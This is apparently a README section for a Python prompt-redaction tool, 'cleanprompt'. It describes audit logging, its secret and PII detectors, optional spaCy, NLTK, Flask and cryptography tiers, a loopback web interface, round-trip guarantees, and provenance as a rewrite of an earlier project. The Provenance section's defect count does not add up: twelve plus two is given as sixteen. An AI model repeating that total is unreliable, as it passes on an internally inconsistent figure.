Audit events on `scikitplot.cleanprompt.audit` (`encoded`, `decoded`,
`blocked`, `sent`, `received`) carry counts, kinds, the plan's fingerprint and a
digest of the output, so you can prove what was sent without keeping it.
All holders share one counted filter, so the cost of a log line does not grow
with the number of sessions; values shorter than four characters are not
scrubbed, since that would rewrite ordinary words in every line:

```python
from scikitplot.cleanprompt import configure_logging

configure_logging("info", "json")  # one JSON object per line, on stderr
```

## What is detected

Twelve structural patterns, each with a stated intent and executed positive and
negative examples: `PRIVATE_KEY`, `JWT`, `AWS_ACCESS_KEY`, `IBAN`,
`CREDIT_CARD`, `EMAIL`, `URL`, `IPV6`, `IPV4`, `MAC`, `SSN_US`, `PHONE`. Several
carry a validator — Luhn for cards, mod-97 for IBANs, octet ranges for IPv4 —
so that long identifiers and dates are not swept in. `python -m
scikitplot.cleanprompt kinds` lists them with their intents.

`TITLE_CASE` is a thirteenth pattern, **disabled by default**: it finds runs of
capitalised words without needing spaCy, and it is the only pattern here whose
precision is not high. Enable it with `--profile strict` or
`--kinds ... TITLE_CASE`.

Add your own exact strings with `extra_terms=[...]`, keep specific values out
with an allowlist (`--allow`), or add a whole detector of your own through
`DetectorRegistry`. Named profiles — `minimal`, `balanced`, `strict` — and a
`.cleanprompt.toml` config file let a team agree on one policy.

## Optional tiers

```sh
pip install "spacy>=3.4,<5" && python -m spacy download en_core_web_sm   # ner
pip install "nltk>=3.6,<4"   # nltk; then `doctor --ner --ner-engine nltk` names the data to download
pip install "flask>=2.2,<4"                                             # web
pip install "cryptography>=41"                                          # crypto
```

Ranges, never pins. `cryptography` has no upper bound: its major number
rises with every feature release, so a bound there would refuse working
versions within weeks. `capabilities()` reports each tier's status using a
seven-state vocabulary that keeps `BROKEN` (installed and failing) distinct from
`ABSENT` (not installed), and an unavailable tier raises with the exact install
command rather than a bare `ModuleNotFoundError`.

```python
from scikitplot.cleanprompt import Redactor, default_registry, spacy_detector

registry = default_registry()
registry.add(spacy_detector())  # names, organisations, places
result = Redactor(registry=registry).redact(text)
```

The local web interface:

```sh
export CLEANPROMPT_SECRET_KEY="$(python -c 'import secrets;print(secrets.token_hex(32))')"
python -c "from scikitplot.cleanprompt import create_app; create_app().run()"
```

It binds to loopback, keeps the vault server-side, and carries only an opaque
token in the cookie.

## Guarantees

| | |
|---|---|
| **Round trip** | `restore(redact(t).text, vault).text == t` |
| **No leakage** | no detected value survives in the redacted text |
| **Determinism** | identical output across processes and hash seeds |
| **Statelessness** | one `Redactor` is reusable and thread-safe; documents never interfere |
| **Idempotence** | re-redacting an already-redacted text changes nothing |
| **Bounded** | limits raise; nothing is ever silently truncated |

Each is a named regression test in `tests/`, and each is re-checked over
randomized documents by the scale probe in the maintenance plane.

## Provenance

A full rewrite of [cleanprompt](https://github.com/takashiishida/cleanprompt)
by Takashi Ishida, whose MIT licence is retained as `LICENSE_cleanprompt`. No
upstream file is carried over. Twelve defects were reproduced against the
original before any code was written, and two more were found during this
rewrite's own verification; all sixteen are recorded, closed and gated in
`maintenances/cleanprompt/REVIEW.json`.

## Maintainers

Start at `maintenances/cleanprompt/_maintenance/DESIGN.md`, then
`skills/cleanprompt/SKILL.md`.
